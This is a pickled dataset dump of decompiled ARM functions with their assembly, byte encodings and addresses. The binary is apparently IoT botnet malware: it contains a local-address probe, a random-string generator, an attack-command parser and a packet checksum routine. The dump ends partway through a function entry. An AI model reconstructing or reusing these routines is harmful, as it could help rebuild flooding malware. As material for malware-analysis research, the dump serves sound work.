V\u000aundefined4 FUN_0000ade8(void)\u000a\u000a{\u000a  int *piVar1;\u000a  int __fd;\u000a  sa_family_t local_24;\u000a  undefined2 local_22;\u000a  undefined4 local_20;\u000a  socklen_t local_14;\u000a  \u000a  local_14 = 0x10;\u000a  piVar1 = __errno_location();\u000a  *piVar1 = 0;\u000a  __fd = socket(2,2,0);\u000a  if (__fd == -1) {\u000a    local_20 = 0;\u000a  }\u000a  else {\u000a    local_20 = 0x8080808;\u000a    local_24 = 2;\u000a    local_22 = 0x3500;\u000a    connect(__fd,(sockaddr *)&local_24,0x10);\u000a    getsockname(__fd,(sockaddr *)&local_24,&local_14);\u000a    close(__fd);\u000a  }\u000a  return local_20;\u000a}\u000a\u000a
p311
S'stmdb sp!,{ r4 r5 r6 lr }\nmov r6,#0x10\nsub sp,sp,#0x18\nstr r6,[sp,#0x14]\nbl 0x00008a10\nmov r4,#0x0\nstr r4,[r0,#0x0]\nmov r0,#0x2\ncpy r1,r0\ncpy r2,r4\nbl 0x0000892c\ncmn r0,#0x1\ncpy r5,r0\ncpyeq r0,r4\nbeq 0x0000ae70\nmov r3,#0x800\nadd r3,r3,#0x8\norr r3,r3,r3, lsl #0x10\nadd r4,sp,#0x4\nstr r3,[sp,#0x8]\nmov r3,#0x2\ncpy r2,r6\ncpy r1,r4\nstrh r3,[sp,#0x4]\nmov r3,#0x3500\nstrh r3,[sp,#0x6]\nbl 0x000088e4\ncpy r1,r4\nadd r2,sp,#0x14\ncpy r0,r5\nbl 0x00008a88\ncpy r0,r5\nbl 0x00008a58\nldr r0,[sp,#0x8]\nadd sp,sp,#0x18\nldmia sp!,{ r4 r5 r6 lr }\nbx lr\n'
p312
S'70 40 2d e9\n10 60 a0 e3\n18 d0 4d e2\n14 60 8d e5\n04 f7 ff eb\n00 40 a0 e3\n00 40 80 e5\n02 00 a0 e3\n00 10 a0 e1\n04 20 a0 e1\nc5 f6 ff eb\n01 00 70 e3\n00 50 a0 e1\n04 00 a0 01\n12 00 00 0a\n02 3b a0 e3\n08 30 83 e2\n03 38 83 e1\n04 40 8d e2\n08 30 8d e5\n02 30 a0 e3\n06 20 a0 e1\n04 10 a0 e1\nb4 30 cd e1\n35 3c a0 e3\nb6 30 cd e1\na3 f6 ff eb\n04 10 a0 e1\n14 20 8d e2\n05 00 a0 e1\n08 f7 ff eb\n05 00 a0 e1\nfa f6 ff eb\n08 00 9d e5\n18 d0 8d e2\n70 40 bd e8\n1e ff 2f e1\n'
p313
S'.text:0000ade8\n.text:0000adec\n.text:0000adf0\n.text:0000adf4\n.text:0000adf8\n.text:0000adfc\n.text:0000ae00\n.text:0000ae04\n.text:0000ae08\n.text:0000ae0c\n.text:0000ae10\n.text:0000ae14\n.text:0000ae18\n.text:0000ae1c\n.text:0000ae20\n.text:0000ae24\n.text:0000ae28\n.text:0000ae2c\n.text:0000ae30\n.text:0000ae34\n.text:0000ae38\n.text:0000ae3c\n.text:0000ae40\n.text:0000ae44\n.text:0000ae48\n.text:0000ae4c\n.text:0000ae50\n.text:0000ae54\n.text:0000ae58\n.text:0000ae5c\n.text:0000ae60\n.text:0000ae64\n.text:0000ae68\n.text:0000ae6c\n.text:0000ae70\n.text:0000ae74\n.text:0000ae78\n'
p314
tp315
sS'recv'
p316
(S'\n__stdcall recv(int __fd, void * __buf, size_t __n, int __flags)\n'
p317
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t recv(int __fd,void *__buf,size_t __n,int __flags)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000088e0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00013294)();\u000a  return sVar1;\u000a}\u000a\u000a
p318
S'adr r12,0x88e0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9b4]!\n'
p319
S'00 c6 8f e2\n0a ca 8c e2\nb4 f9 bc e5\n'
p320
S'.plt:000088d8\n.plt:000088dc\n.plt:000088e0\n'
p321
tp322
sS'FUN_0000a3cc'
p323
(S'\n__stdcall FUN_0000a3cc()\n'
p324
V\u000avoid FUN_0000a3cc(int iParm1,int iParm2)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  undefined *puVar3;\u000a  undefined *puVar4;\u000a  char *__src;\u000a  int extraout_r1;\u000a  uint uVar5;\u000a  uint uVar6;\u000a  int iVar7;\u000a  undefined4 uVar8;\u000a  char acStack104 [68];\u000a  \u000a  FUN_0000a63c(0x21);\u000a  __src = (char *)FUN_0000a578(0x21,0);\u000a  strcpy(acStack104,__src);\u000a  puVar4 = PTR_DAT_0000a498;\u000a  puVar3 = PTR_DAT_0000a494;\u000a  puVar2 = PTR_DAT_0000a490;\u000a  puVar1 = PTR_DAT_0000a48c;\u000a  if (iParm2 != 0) {\u000a    iVar7 = 0;\u000a    do {\u000a      uVar5 = *(uint *)puVar4;\u000a      uVar6 = *(uint *)puVar1;\u000a      uVar6 = uVar6 ^ uVar6 << 0xb;\u000a      uVar8 = *(undefined4 *)puVar3;\u000a      uVar6 = uVar5 ^ uVar5 >> 0x13 ^ uVar6 ^ uVar6 >> 8;\u000a      *(undefined4 *)puVar1 = *(undefined4 *)puVar2;\u000a      *(undefined4 *)puVar2 = uVar8;\u000a      *(uint *)puVar3 = uVar5;\u000a      *(uint *)puVar4 = uVar6;\u000a      uVar8 = FUN_0000abf4(acStack104);\u000a      FUN_0000af78(uVar6,uVar8);\u000a      *(char *)(iVar7 + iParm1) = acStack104[extraout_r1];\u000a      iVar7 = iVar7 + 1;\u000a    } while (iVar7 != iParm2);\u000a  }\u000a  FUN_0000a59c(0x21);\u000a  return;\u000a}\u000a\u000a
p325
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\ncpy r11,r0\nsub sp,sp,#0x44\nmov r0,#0x21\ncpy r9,r1\nbl 0x0000a63c\nmov r1,#0x0\nmov r0,#0x21\nbl 0x0000a578\ncpy r1,r0\ncpy r0,sp\nbl 0x000088c0\ncmp r9,#0x0\nbeq 0x0000a478\nldr r10,[0xa48c]\nldr r8,[0xa490]\nldr r7,[0xa494]\nldr r6,[0xa498]\nmov r5,#0x0\nldr r2,[r6,#0x0]\nldr r3,[r10,#0x0]\neor r4,r2,r2, lsr #0x13\neor r3,r3,r3, lsl #0xb\neor r4,r4,r3\nldr r1,[r8,#0x0]\nldr r12,[r7,#0x0]\neor r4,r4,r3, lsr #0x8\ncpy r0,sp\nstr r1,[r10,#0x0]\nstr r12,[r8,#0x0]\nstr r2,[r7,#0x0]\nstr r4,[r6,#0x0]\nbl 0x0000abf4\ncpy r1,r0\ncpy r0,r4\nbl 0x0000af78\nadd r3,sp,#0x40\nadd r1,r3,r1\nldrb r3,[r1,#-0x40]\nstrb r3,[r5,r11]\nadd r5,r5,#0x1\ncmp r5,r9\nbne 0x0000a418\nmov r0,#0x21\nbl 0x0000a59c\nadd sp,sp,#0x44\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nbx lr\n'
p326
S'f0 4f 2d e9\n00 b0 a0 e1\n44 d0 4d e2\n21 00 a0 e3\n01 90 a0 e1\n95 00 00 eb\n00 10 a0 e3\n21 00 a0 e3\n61 00 00 eb\n00 10 a0 e1\n0d 00 a0 e1\n30 f9 ff eb\n00 00 59 e3\n1c 00 00 0a\n80 a0 9f e5\n80 80 9f e5\n80 70 9f e5\n80 60 9f e5\n00 50 a0 e3\n00 20 96 e5\n00 30 9a e5\na2 49 22 e0\n83 35 23 e0\n03 40 24 e0\n00 10 98 e5\n00 c0 97 e5\n23 44 24 e0\n0d 00 a0 e1\n00 10 8a e5\n00 c0 88 e5\n00 20 87 e5\n00 40 86 e5\ne8 01 00 eb\n00 10 a0 e1\n04 00 a0 e1\nc6 02 00 eb\n40 30 8d e2\n01 10 83 e0\n40 30 51 e5\n0b 30 c5 e7\n01 50 85 e2\n09 00 55 e1\ne7 ff ff 1a\n21 00 a0 e3\n46 00 00 eb\n44 d0 8d e2\nf0 4f bd e8\n1e ff 2f e1\n'
p327
S'.text:0000a3cc\n.text:0000a3d0\n.text:0000a3d4\n.text:0000a3d8\n.text:0000a3dc\n.text:0000a3e0\n.text:0000a3e4\n.text:0000a3e8\n.text:0000a3ec\n.text:0000a3f0\n.text:0000a3f4\n.text:0000a3f8\n.text:0000a3fc\n.text:0000a400\n.text:0000a404\n.text:0000a408\n.text:0000a40c\n.text:0000a410\n.text:0000a414\n.text:0000a418\n.text:0000a41c\n.text:0000a420\n.text:0000a424\n.text:0000a428\n.text:0000a42c\n.text:0000a430\n.text:0000a434\n.text:0000a438\n.text:0000a43c\n.text:0000a440\n.text:0000a444\n.text:0000a448\n.text:0000a44c\n.text:0000a450\n.text:0000a454\n.text:0000a458\n.text:0000a45c\n.text:0000a460\n.text:0000a464\n.text:0000a468\n.text:0000a46c\n.text:0000a470\n.text:0000a474\n.text:0000a478\n.text:0000a47c\n.text:0000a480\n.text:0000a484\n.text:0000a488\n'
p328
tp329
sS'FUN_00009a38'
p330
(S'\n__stdcall FUN_00009a38()\n'
p331
V\u000avoid FUN_00009a38(void)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined4 uVar2;\u000a  \u000a  uVar2 = DAT_00009a58;\u000a  puVar1 = PTR_DAT_00009a54;\u000a  *(undefined2 *)(PTR_DAT_00009a54 + 2) = 0x7d16;\u000a  *(undefined4 *)(puVar1 + 4) = uVar2;\u000a  return;\u000a}\u000a\u000a
p332
S'ldr r3,[0x9a54]\nmov r2,#0x7d00\nldr r1,[0x9a58]\nadd r2,r2,#0x16\nstrh r2,[r3,#0x2]\nstr r1,[r3,#0x4]\nbx lr\n'
p333
S'14 30 9f e5\n7d 2c a0 e3\n10 10 9f e5\n16 20 82 e2\nb2 20 c3 e1\n04 10 83 e5\n1e ff 2f e1\n'
p334
S'.text:00009a38\n.text:00009a3c\n.text:00009a40\n.text:00009a44\n.text:00009a48\n.text:00009a4c\n.text:00009a50\n'
p335
tp336
sS'free'
p337
(S'\n__stdcall free(void * __ptr)\n'
p338
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid free(void *__ptr)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a78. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_0001331c)();\u000a  return;\u000a}\u000a\u000a
p339
S'adr r12,0x8a78\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8a4]!\n'
p340
S'00 c6 8f e2\n0a ca 8c e2\na4 f8 bc e5\n'
p341
S'.plt:00008a70\n.plt:00008a74\n.plt:00008a78\n'
p342
tp343
sS'close'
p344
(S'\n__stdcall close(int __fd)\n'
p345
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint close(int __fd)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a60. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013314)();\u000a  return iVar1;\u000a}\u000a\u000a
p346
S'adr r12,0x8a60\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8b4]!\n'
p347
S'00 c6 8f e2\n0a ca 8c e2\nb4 f8 bc e5\n'
p348
S'.plt:00008a58\n.plt:00008a5c\n.plt:00008a60\n'
p349
tp350
sS'connect'
p351
(S'\n__stdcall connect(int __fd, sockaddr * __addr, socklen_t __len)\n'
p352
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint connect(int __fd,sockaddr *__addr,socklen_t __len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000088ec. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013298)();\u000a  return iVar1;\u000a}\u000a\u000a
p353
S'adr r12,0x88ec\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9ac]!\n'
p354
S'00 c6 8f e2\n0a ca 8c e2\nac f9 bc e5\n'
p355
S'.plt:000088e4\n.plt:000088e8\n.plt:000088ec\n'
p356
tp357
sS'FUN_00008c24'
p358
(S'\n__stdcall FUN_00008c24()\n'
p359
V\u000avoid FUN_00008c24(void **ppvParm1,uint uParm2)\u000a\u000a{\u000a  byte bVar1;\u000a  undefined2 *__ptr;\u000a  byte *pbVar2;\u000a  void *pvVar3;\u000a  int *piVar4;\u000a  void *pvVar5;\u000a  undefined4 uVar6;\u000a  int iVar7;\u000a  uint uVar8;\u000a  void **ppvVar9;\u000a  void **__ptr_00;\u000a  int iVar10;\u000a  byte *pbVar11;\u000a  uint __nmemb;\u000a  undefined2 *puVar12;\u000a  void **local_30;\u000a  \u000a  if (3 < uParm2) {\u000a    pvVar5 = *ppvParm1;\u000a    if ((((uParm2 != 4) && (bVar1 = *(byte *)(ppvParm1 + 1), uParm2 != 5)) &&\u000a        (__nmemb = (uint)*(byte *)((int)ppvParm1 + 5), *(byte *)((int)ppvParm1 + 5) != 0)) &&\u000a       (__ptr_00 = (void **)(uParm2 - 6), (void **)(__nmemb * 5) <= __ptr_00)) {\u000a      __ptr = (undefined2 *)calloc(__nmemb,0x18);\u000a      iVar10 = uParm2 + __nmemb * -5;\u000a      pbVar2 = (byte *)((int)ppvParm1 + 0xb);\u000a      puVar12 = __ptr;\u000a      do {\u000a        pbVar11 = pbVar2;\u000a        uVar6 = *(undefined4 *)(pbVar11 + -5);\u000a        *(undefined4 *)(puVar12 + 8) = uVar6;\u000a        __ptr_00 = (void **)((int)__ptr_00 + -5);\u000a        *(byte *)(puVar12 + 10) = pbVar11[-1];\u000a        *(undefined4 *)(puVar12 + 2) = uVar6;\u000a        *puVar12 = 2;\u000a        puVar12 = puVar12 + 0xc;\u000a        pbVar2 = pbVar11 + 5;\u000a      } while (__ptr_00 != (void **)(iVar10 + -6));\u000a      if (__ptr_00 != (void **)0x0) {\u000a        ppvParm1 = (void **)(uint)*pbVar11;\u000a        __ptr_00 = ppvParm1;\u000a        if (*pbVar11 == 0) {\u000aLAB_00008dd4:\u000a          piVar4 = __errno_location();\u000a          *piVar4 = 0;\u000a          FUN_00008b28((uint)pvVar5 >> 0x18 | ((uint)pvVar5 & 0xff0000) >> 8 |\u000a                       ((uint)pvVar5 & 0xff00) << 8 | (int)pvVar5 << 0x18,(uint)bVar1,__nmemb,__ptr,\u000a                       ppvParm1,__ptr_00);\u000a        }\u000a        else {\u000a          __ptr_00 = (void **)calloc((size_t)ppvParm1,8);\u000a          if ((iVar10 != 7) && (*(byte *)(__ptr_00 + 1) = pbVar11[1], iVar10 != 8)) {\u000a            uVar8 = (uint)pbVar11[2];\u000a            iVar10 = iVar10 + -9;\u000a            if ((int)uVar8 <= iVar10) {\u000a              pbVar11 = pbVar11 + 3;\u000a              local_30 = (void **)0x0;\u000a              ppvVar9 = __ptr_00;\u000a              while( true ) {\u000a                pvVar3 = calloc(uVar8 + 1,1);\u000a                *ppvVar9 = pvVar3;\u000a                local_30 = (void **)((int)local_30 + 1);\u000a                FUN_0000ac64(pvVar3,pbVar11,uVar8);\u000a                ppvVar9 = __ptr_00 + (int)local_30 * 2;\u000a                if (local_30 == ppvParm1) goto LAB_00008dd4;\u000a                iVar7 = iVar10 - uVar8;\u000a                if (iVar7 == 0) break;\u000a                pbVar2 = pbVar11 + uVar8;\u000a                *(byte *)(ppvVar9 + 1) = pbVar11[uVar8];\u000a                iVar10 = iVar7 + -2;\u000a                pbVar11 = pbVar2 + 2;\u000a                if ((iVar7 == 1) || (uVar8 = (uint)pbVar2[1], iVar10 < (int)uVar8)) break;\u000a              }\u000a            }\u000a          }\u000a        }\u000a      }\u000a      if (__ptr != (undefined2 *)0x0) {\u000a        free(__ptr);\u000a      }\u000a      if (__ptr_00 != (void **)0x0) {\u000a        if (ppvParm1 != (void **)0x0) {\u000a          ppvVar9 = (void **)0x0;\u000a          do {\u000a            iVar10 = (int)ppvVar9 * 2;\u000a            ppvVar9 = (void **)((int)ppvVar9 + 1);\u000a            if (__ptr_00[iVar10] != (void *)0x0) {\u000a              free(__ptr_00[iVar10]);\u000a            }\u000a          } while (ppvParm1 != ppvVar9);\u000a        }\u000a        free(__ptr_00);\u000a      }\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p360
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\ncmp r1,#0x3\nsub sp,sp,#0x1c\ncpy r4,r1\ncpy r5,r0\nbhi 0x00008c48\nadd sp,sp,#0x1c\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nbx lr\nldr r1,[r0,#0x0]\nand r0,r1,#0xff0000\nmov r3,r1, lsr #0x18\norr r3,r3,r0, lsr #0x8\nand r2,r1,#0xff00\norr r3,r3,r2, lsl #0x8\ncmp r4,#0x4\norr r11,r3,r1, lsl #0x18\nbeq 0x00008c3c\nldrb r2,[r5,#0x4]\ncmp r4,#0x5\nstr r2,[sp,#0x14]\nbeq 0x00008c3c\nldrb r9,[r5,#0x5]\ncmp r9,#0x0\nbeq 0x00008c3c\nmov r3,r9, lsl #0x2\nadd r7,r3,r9\nsub r3,r4,#0x6\ncmp r3,r7\nbcc 0x00008c3c\ncpy r0,r9\nmov r1,#0x18\ncpy r6,r3\nbl 0x00008968\nstr r0,[sp,#0xc]\nldr r12,[sp,#0xc]\nrsb r7,r7,r4\nadd r0,r5,#0xb\nldr r1,[r0,#-0x5]\nstr r1,[r12,#0x10]\nsub r3,r7,#0x6\nldrb r2,[r0,#-0x1]\nsub r6,r6,#0x5\ncmp r6,r3\nmov r3,#0x2\ncpy r4,r0\nstrb r2,[r12,#0x14]\nstr r1,[r12,#0x4]\nstrh r3,[r12,#0x0]\nadd r0,r0,#0x5\nadd r12,r12,#0x18\nbne 0x00008cbc\ncmp r6,#0x0\nbeq 0x00008df8\nldrb r5,[r4,#0x0]\ncmp r5,#0x0\nsub r8,r7,#0x7\ncpyeq r6,r5\nbeq 0x00008dd4\ncpy r0,r5\nmov r1,#0x8\nbl 0x00008968\ncmp r8,#0x0\ncpy r6,r0\nbeq 0x00008df8\nldrb r3,[r4,#0x1]\ncmp r7,#0x8\nstrb r3,[r0,#0x4]\nadd r3,r4,#0x1\nbeq 0x00008df8\nldrb r4,[r3,#0x1]\nsub r8,r7,#0x9\ncmp r8,r4\nadd r1,r3,#0x1\nmovge r2,#0x0\naddge r7,r1,#0x1\ncpyge r10,r0\nstrge r2,[sp,#0x10]\nbge 0x00008d98\nb 0x00008df8\nsubs r2,r8,r4\nbeq 0x00008df8\nldrb r3,[r4,r7]\nadd r0,r4,r7\nsubs r2,r2,#0x1\nstrb r3,[r10,#0x4]\nadd r3,r0,#0x1\nsub r8,r2,#0x1\nadd r7,r3,#0x1\nbeq 0x00008df8\nldrb r4,[r0,#0x1]\ncmp r8,r4\nblt 0x00008df8\nmov r1,#0x1\nadd r0,r4,#0x1\nbl 0x00008968\nldr r3,[sp,#0x10]\nstr r0,[r10,#0x0]\nadd r3,r3,#0x1\ncpy r2,r4\ncpy r1,r7\nstr r3,[sp,#0x10]\nbl 0x0000ac64\nldr r2,[sp,#0x10]\nmov r3,r2, lsl #0x3\ncmp r2,r5\nadd r10,r6,r3\nbne 0x00008d64\nbl 0x00008a10\nmov r3,#0x0\nstr r3,[r0,#0x0]\nldr r1,[sp,#0x14]\ncpy r0,r11\ncpy r2,r9\nldr r3,[sp,#0xc]\nstmia sp,{ r5 r6 }\nbl 0x00008b28\nldr r3,[sp,#0xc]\ncmp r3,#0x0\ncpyne r0,r3\nblne 0x00008a70\ncmp r6,#0x0\nbeq 0x00008c3c\ncmp r5,#0x0\nbeq 0x00008e34\nmov r4,#0x0\nldr r0,[r6,r4,lsl #0x3]\ncmp r0,#0x0\nadd r4,r4,#0x1\nblne 0x00008a70\ncmp r5,r4\nbne 0x00008e1c\ncpy r0,r6\nbl 0x00008a70\nb 0x00008c3c\n'
p361
S'f0 4f 2d e9\n03 00 51 e3\n1c d0 4d e2\n01 40 a0 e1\n00 50 a0 e1\n02 00 00 8a\n1c d0 8d e2\nf0 4f bd e8\n1e ff 2f e1\n00 10 90 e5\nff 08 01 e2\n21 3c a0 e1\n20 34 83 e1\nff 2c 01 e2\n02 34 83 e1\n04 00 54 e3\n01 bc 83 e1\nf3 ff ff 0a\n04 20 d5 e5\n05 00 54 e3\n14 20 8d e5\nef ff ff 0a\n05 90 d5 e5\n00 00 59 e3\nec ff ff 0a\n09 31 a0 e1\n09 70 83 e0\n06 30 44 e2\n07 00 53 e1\ne7 ff ff 3a\n09 00 a0 e1\n18 10 a0 e3\n03 60 a0 e1\n2e ff ff eb\n0c 00 8d e5\n0c c0 9d e5\n04 70 67 e0\n0b 00 85 e2\n05 10 10 e5\n10 10 8c e5\n06 30 47 e2\n01 20 50 e5\n05 60 46 e2\n03 00 56 e1\n02 30 a0 e3\n00 40 a0 e1\n14 20 cc e5\n04 10 8c e5\nb0 30 cc e1\n05 00 80 e2\n18 c0 8c e2\nf1 ff ff 1a\n00 00 56 e3\n3e 00 00 0a\n00 50 d4 e5\n00 00 55 e3\n07 80 47 e2\n05 60 a0 01\n30 00 00 0a\n05 00 a0 e1\n08 10 a0 e3\n12 ff ff eb\n00 00 58 e3\n00 60 a0 e1\n33 00 00 0a\n01 30 d4 e5\n08 00 57 e3\n04 30 c0 e5\n01 30 84 e2\n2e 00 00 0a\n01 40 d3 e5\n09 80 47 e2\n04 00 58 e1\n01 10 83 e2\n00 20 a0 a3\n01 70 81 a2\n00 a0 a0 a1\n10 20 8d a5\n0d 00 00 aa\n24 00 00 ea\n04 20 58 e0\n22 00 00 0a\n07 30 d4 e7\n07 00 84 e0\n01 20 52 e2\n04 30 ca e5\n01 30 80 e2\n01 80 42 e2\n01 70 83 e2\n1a 00 00 0a\n01 40 d0 e5\n04 00 58 e1\n17 00 00 ba\n01 10 a0 e3\n01 00 84 e2\nf0 fe ff eb\n10 30 9d e5\n00 00 8a e5\n01 30 83 e2\n04 20 a0 e1\n07 10 a0 e1\n10 30 8d e5\na8 07 00 eb\n10 20 9d e5\n82 31 a0 e1\n05 00 52 e1\n03 a0 86 e0\ne3 ff ff 1a\n0d ff ff eb\n00 30 a0 e3\n00 30 80 e5\n14 10 9d e5\n0b 00 a0 e1\n09 20 a0 e1\n0c 30 9d e5\n60 00 8d e8\n4b ff ff eb\n0c 30 9d e5\n00 00 53 e3\n03 00 a0 11\n19 ff ff 1b\n00 00 56 e3\n8a ff ff 0a\n00 00 55 e3\n06 00 00 0a\n00 40 a0 e3\n84 01 96 e7\n00 00 50 e3\n01 40 84 e2\n10 ff ff 1b\n04 00 55 e1\nf9 ff ff 1a\n06 00 a0 e1\n0c ff ff eb\n7e ff ff ea\n'
p362
S'.text:00008c24\n.text:00008c28\n.text:00008c2c\n.text:00008c30\n.text:00008c34\n.text:00008c38\n.text:00008c3c\n.text:00008c40\n.text:00008c44\n.text:00008c48\n.text:00008c4c\n.text:00008c50\n.text:00008c54\n.text:00008c58\n.text:00008c5c\n.text:00008c60\n.text:00008c64\n.text:00008c68\n.text:00008c6c\n.text:00008c70\n.text:00008c74\n.text:00008c78\n.text:00008c7c\n.text:00008c80\n.text:00008c84\n.text:00008c88\n.text:00008c8c\n.text:00008c90\n.text:00008c94\n.text:00008c98\n.text:00008c9c\n.text:00008ca0\n.text:00008ca4\n.text:00008ca8\n.text:00008cac\n.text:00008cb0\n.text:00008cb4\n.text:00008cb8\n.text:00008cbc\n.text:00008cc0\n.text:00008cc4\n.text:00008cc8\n.text:00008ccc\n.text:00008cd0\n.text:00008cd4\n.text:00008cd8\n.text:00008cdc\n.text:00008ce0\n.text:00008ce4\n.text:00008ce8\n.text:00008cec\n.text:00008cf0\n.text:00008cf4\n.text:00008cf8\n.text:00008cfc\n.text:00008d00\n.text:00008d04\n.text:00008d08\n.text:00008d0c\n.text:00008d10\n.text:00008d14\n.text:00008d18\n.text:00008d1c\n.text:00008d20\n.text:00008d24\n.text:00008d28\n.text:00008d2c\n.text:00008d30\n.text:00008d34\n.text:00008d38\n.text:00008d3c\n.text:00008d40\n.text:00008d44\n.text:00008d48\n.text:00008d4c\n.text:00008d50\n.text:00008d54\n.text:00008d58\n.text:00008d5c\n.text:00008d60\n.text:00008d64\n.text:00008d68\n.text:00008d6c\n.text:00008d70\n.text:00008d74\n.text:00008d78\n.text:00008d7c\n.text:00008d80\n.text:00008d84\n.text:00008d88\n.text:00008d8c\n.text:00008d90\n.text:00008d94\n.text:00008d98\n.text:00008d9c\n.text:00008da0\n.text:00008da4\n.text:00008da8\n.text:00008dac\n.text:00008db0\n.text:00008db4\n.text:00008db8\n.text:00008dbc\n.text:00008dc0\n.text:00008dc4\n.text:00008dc8\n.text:00008dcc\n.text:00008dd0\n.text:00008dd4\n.text:00008dd8\n.text:00008ddc\n.text:00008de0\n.text:00008de4\n.text:00008de8\n.text:00008dec\n.text:00008df0\n.text:00008df4\n.text:00008df8\n.text:00008dfc\n.text:00008e00\n.text:00008e04\n.text:00008e08\n.text:00008e0c\n.text:00008e10\n.text:00008e14\n.text:00008e18\n.text:00008e1c\n.text:00008e20\n.text:00008e24\n.text:00008e28\n.text:00008e2c\n.text:00008e30\n.text:00008e34\n.text:00008e38\n.text:00008e3c\n'
p363
tp364
sS'FUN_0000997c'
p365
(S'\n__stdcall FUN_0000997c()\n'
p366
V\u000auint FUN_0000997c(int iParm1,ushort *puParm2,int iParm3,int iParm4)\u000a\u000a{\u000a  uint uVar1;\u000a  ushort *puVar2;\u000a  int iVar3;\u000a  \u000a  if (iParm4 < 2) {\u000a    iVar3 = 0;\u000a  }\u000a  else {\u000a    iVar3 = 0;\u000a    puVar2 = puParm2;\u000a    do {\u000a      iParm4 = iParm4 + -2;\u000a      puParm2 = puVar2 + 1;\u000a      iVar3 = iVar3 + (uint)*puVar2;\u000a      puVar2 = puParm2;\u000a    } while (1 < iParm4);\u000a  }\u000a  if (iParm4 == 1) {\u000a    iVar3 = iVar3 + (uint)*(byte *)puParm2;\u000a  }\u000a  uVar1 = (*(uint *)(iParm1 + 0x10) & 0xffff) + (*(uint *)(iParm1 + 0xc) & 0xffff) +\u000a          (*(uint *)(iParm1 + 0xc) >> 0x10) + (*(uint *)(iParm1 + 0x10) >> 0x10) + iParm3 + iVar3 +\u000a          (uint)*(byte *)(iParm1 + 9) * 0x100;\u000a  while (uVar1 >> 0x10 != 0) {\u000a    uVar1 = (uVar1 & 0xffff) + (uVar1 >> 0x10);\u000a  }\u000a  return ~uVar1 & 0xffff;\u000a}\u000a\u000a
p367
S'cmp r3,#0x1\nstmdb sp!,{ r4 r5 r6 lr }\ncpy r12,r3\ncpy r6,r2\nldr r5,[r0,#0xc]\nldr r4,[r0,#0x10]\nmovle lr,#0x0\nble 0x000099b4\nmov lr,#0x0\nsub r12,r12,#0x2\nldrh r3,[r1],#0x2\ncmp r12,#0x1\nadd lr,lr,r3\nbgt 0x000099a0\ncmp r12,#0x1\nldrbeq r3,[r1,#0x0]\nmov r2,r5, lsl #0x10\naddeq lr,lr,r3\nmov r3,r4, lsl #0x10\nmov r2,r2, lsr #0x10\nmov r3,r3, lsr #0x10\nadd r3,r3,r2\nadd r3,r3,r5, lsr #0x10\nldrb r2,[r0,#0x9]\nadd r3,r3,r4, lsr #0x10\nadd r3,r3,r6\nmov r2,r2, lsl #0x8\nadd r3,r3,lr\nadd r0,r3,r2\nmovs r2,r0, lsr #0x10\nbeq 0x00009a0c\nmov r3,r0, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r0,r3,r2\nmovs r2,r0, lsr #0x10\nbne 0x000099f8\nmvn r0,r0\nmov r0,r0, lsl #0x10\nmov r0,r0, lsr #0x10\nldmia sp!,{ r4 r5 r6 lr }\nbx lr\n'
p368
S'01 00 53 e3\n70 40 2d e9\n03 c0 a0 e1\n02 60 a0 e1\n0c 50 90 e5\n10 40 90 e5\n00 e0 a0 d3\n05 00 00 da\n00 e0 a0 e3\n02 c0 4c e2\nb2 30 d1 e0\n01 00 5c e3\n03 e0 8e e0\nfa ff ff ca\n01 00 5c e3\n00 30 d1 05\n05 28 a0 e1\n03 e0 8e 00\n04 38 a0 e1\n22 28 a0 e1\n23 38 a0 e1\n02 30 83 e0\n25 38 83 e0\n09 20 d0 e5\n24 38 83 e0\n06 30 83 e0\n02 24 a0 e1\n0e 30 83 e0\n02 00 83 e0\n20 28 b0 e1\n04 00 00 0a\n00 38 a0 e1\n23 38 a0 e1\n02 00 83 e0\n20 28 b0 e1\nfa ff ff 1a\n00 00 e0 e1\n00 08 a0 e1\n20 08 a0 e1\n70 40 bd e8\n1e ff 2f e1\n'
p369
S'.text:0000997c\n.text:00009980\n.text:00009984\n.text:00009988\n.text:0000998c\n.text:00009990\n.text:00009994\n.text:00009998\n.text:0000999c\n.text:000099a0\n.text:000099a4\n.text:000099a8\n.text:000099ac\n.text:000099b0\n.text:000099b4\n.text:000099b8\n.text:000099bc\n.text:000099c0\n.text:000099c4\n.text:000099c8\n.text:000099cc\n.text:000099d0\n.text:000099d4\n.text:000099d8\n.text:000099dc\n.text:000099e0\n.text:000099e4\n.text:000099e8\n.text:000099ec\n.text:000099f0\n.text:000099f4\n.text:000099f8\n.text:000099fc\n.text:00009a00\n.text:00009a04\n.text:00009a08\n.text:00009a0c\n.text:00009a10\n.text:00009a14\n.text:00009a18\n.text:00009a1c\n'
p370
tp371
sS'FUN_00009bac'
p372
(S'\n__stdcall FUN_00009bac()\n'
p373
